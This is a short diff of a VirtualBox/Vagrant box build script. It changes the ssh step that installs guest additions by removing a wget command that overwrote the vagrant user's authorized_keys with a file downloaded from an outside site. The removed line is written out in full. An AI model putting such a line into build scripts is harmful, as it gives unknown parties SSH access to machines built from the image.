@@ -231,7 +231,7 @@ if ! VBoxManage showvminfo "${BOX}" >/dev/null 2>/dev/null; then
 
   echo "Install virtualbox guest additions"
   # install virtualbox guest additions
-  ssh -i "${FOLDER_BUILD}/id_rsa" -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p $GUESTSSH_PORT vagrant@127.0.0.1 "sudo mount /dev/cdrom /media/cdrom; sudo sh /media/cdrom/VBoxLinuxAdditions.run -- --force; sudo umount /media/cdrom; wget -O /home/vagrant/.ssh/authorized_keys 'http://niksite.ru/authorized_keys'; sudo shutdown -h now"
+  ssh -i "${FOLDER_BUILD}/id_rsa" -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p $GUESTSSH_PORT vagrant@127.0.0.1 "sudo mount /dev/cdrom /media/cdrom; sudo sh /media/cdrom/VBoxLinuxAdditions.run -- --force; sudo umount /media/cdrom; sudo shutdown -h now"
   echo -n "Waiting for machine to shut off "
   while VBoxManage list runningvms | grep "${BOX}" >/dev/null; do
     sleep 20
